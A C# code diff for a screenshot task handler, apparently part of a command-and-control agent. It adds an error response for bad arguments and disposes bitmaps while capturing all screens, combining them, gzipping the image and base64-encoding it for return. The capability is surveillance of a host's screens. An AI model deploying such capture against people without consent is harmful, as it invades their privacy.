@@ -33,6 +33,13 @@ namespace Workflow
             ScreenshotArgs args = JsonSerializer.Deserialize<ScreenshotArgs>(job.task.parameters);
             if(args is null){
                 DebugLog.Log($"{Name} args null [{job.task.id}]");
+                messageManager.AddTaskResponse(new TaskResponse
+                {
+                    completed = true,
+                    user_output = "Failed to deserialize arguments.",
+                    task_id = job.task.id,
+                    status = "error"
+                });
                 return;
             }
 
@@ -86,33 +93,39 @@ namespace Workflow
                     }
                 }
 
-                // Create a new bitmap to hold the combined image
-                var combinedBitmap = new Bitmap(combinedWidth, maxHeight);
-
-                // Draw each screen's bitmap onto the combined bitmap
-                int x = 0;
-                foreach (var bitmap in bitmaps)
-                {
-                    using (var graphics = Graphics.FromImage(combinedBitmap))
-                    {
-                        graphics.DrawImage(bitmap, x, 0);
-                    }
-                    x += bitmap.Width;
-                }
-
-                // Convert to base64
-                var converter = new ImageConverter();
-                var combinedBitmapBytes = (byte[])converter.ConvertTo(combinedBitmap, typeof(byte[]));
                 byte[] outputBytes;
-
-                // Compress the image
-                using (var memoryStream = new MemoryStream())
+                using (var combinedBitmap = new Bitmap(combinedWidth, maxHeight))
                 {
-                    using (var gzipStream = new GZipStream(memoryStream, CompressionMode.Compress))
+                    // Draw each screen's bitmap onto the combined bitmap
+                    int x = 0;
+                    foreach (var bitmap in bitmaps)
                     {
-                        gzipStream.Write(combinedBitmapBytes, 0, combinedBitmapBytes.Length);
+                        using (var graphics = Graphics.FromImage(combinedBitmap))
+                        {
+                            graphics.DrawImage(bitmap, x, 0);
+                        }
+                        x += bitmap.Width;
                     }
-                    outputBytes = memoryStream.ToArray();
+
+                    // Dispose individual screen bitmaps
+                    foreach (var bitmap in bitmaps)
+                    {
+                        bitmap.Dispose();
+                    }
+
+                    // Convert to base64
+                    var converter = new ImageConverter();
+                    var combinedBitmapBytes = (byte[])converter.ConvertTo(combinedBitmap, typeof(byte[]));
+
+                    // Compress the image
+                    using (var memoryStream = new MemoryStream())
+                    {
+                        using (var gzipStream = new GZipStream(memoryStream, CompressionMode.Compress))
+                        {
+                            gzipStream.Write(combinedBitmapBytes, 0, combinedBitmapBytes.Length);
+                        }
+                        outputBytes = memoryStream.ToArray();
+                    }
                 }
 
                 var combinedBitmapBase64 = Convert.ToBase64String(outputBytes);
